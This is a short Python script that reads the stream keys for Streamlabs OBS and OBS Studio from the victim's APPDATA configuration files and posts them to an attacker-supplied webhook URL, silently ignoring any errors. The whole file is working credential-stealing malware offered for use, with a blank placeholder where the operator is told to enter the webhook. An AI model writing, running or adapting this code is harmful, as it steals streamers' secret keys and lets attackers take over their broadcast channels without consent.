import os
import json
import requests


#enter you webhook url here
WEBHOOK_URL = ""


def getKeys(path):
    with open(path) as f:
            path = json.load(f)
            key = path.get("settings").get('key')
    return key

def main(WEBHOOK_URL):

    roaming = os.getenv('APPDATA')

    paths = {
        'SLOBS' : roaming + '\\slobs-client\\service.json',
        'OBS' : roaming + '\\obs-studio\\basic\\profiles\\Untitled\\service.json'
    }

    message = ''

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        
        message += f'\n**{platform}**\n```\n'

        keys = getKeys(path)

        if len(keys) > 0:
            for key in keys:
                message += f'{key}'
        else:
            message += 'No keys found.\n'

        message += '```'

    try:
        requests.post(WEBHOOK_URL, json = {'content' : f'{message}'})
    except:
        pass
        
    

if __name__ == '__main__':
    main(WEBHOOK_URL)